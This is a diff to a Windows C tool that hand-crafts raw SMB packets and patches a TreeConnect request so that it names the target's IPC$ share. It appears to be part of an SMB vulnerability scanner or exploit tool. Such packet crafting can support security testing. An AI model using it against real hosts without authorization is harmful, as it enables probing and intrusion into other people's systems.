@@ -1,6 +1,7 @@
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <winsock.h>
 #pragma comment(lib,"wsock32.lib")
 
@@ -26,6 +27,7 @@ unsigned char TreeConnect_AndX_Request[] =
 "\x2e\x00\x32\x00\x32\x00\x2e\x00\x35\x00\x2e\x00\x34\x00\x36\x00"
 "\x5c\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x3f\x3f\x3f\x3f"
 "\x3f\x00";
+unsigned char ModifiedTreeConnectRequest[sizeof(TreeConnect_AndX_Request)+20];
 
 unsigned char trans2_request[] = 
 "\x00\x19\xBB\x4F\x4C\xD8\x00\x25\xB3\xF5\xFA\x74\x08\x00\x45\x00"
@@ -183,9 +185,29 @@ int main(int argc, char* argv[])
 	userid = *(WORD*)(recvbuff + 0x20);       //get userid
 	memcpy(TreeConnect_AndX_Request + 0x20, (char*)&userid, 2); //update userid
 
+	
+	int i;
+	char hostipc[40];
+	char hostipc2[40*2];
+	char smblen;
+	char unclen;
+	sprintf((char *)hostipc,"\\\\%s\\ipc$", target);
+	for (i=0; i<40; i++)
+	{
+		hostipc2[i*2] = hostipc[i];
+		hostipc2[i*2+1] = 0;
+	}
+	memcpy(ModifiedTreeConnectRequest, TreeConnect_AndX_Request, sizeof(TreeConnect_AndX_Request)-1);
+	memcpy(ModifiedTreeConnectRequest+48, &hostipc2[0], strlen(hostipc)*2);
+	memcpy(ModifiedTreeConnectRequest+47+strlen(hostipc)*2, TreeConnect_AndX_Request+87, 9);
+	smblen = 52+(char)strlen(hostipc)*2;
+	memcpy(ModifiedTreeConnectRequest+3, &smblen, 1);
+	unclen = 9 + (char)strlen(hostipc)*2;
+	memcpy(ModifiedTreeConnectRequest+45, &unclen, 1);
+	
 	//send TreeConnect request packet
 	printf("sending TreeConnect Request!\n");
-	send(sock, (char*)TreeConnect_AndX_Request, sizeof(TreeConnect_AndX_Request) - 1, 0);
+	send(sock, (char*)ModifiedTreeConnectRequest, sizeof(TreeConnect_AndX_Request) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 	
 	//copy the treeID from the TreeConnect response
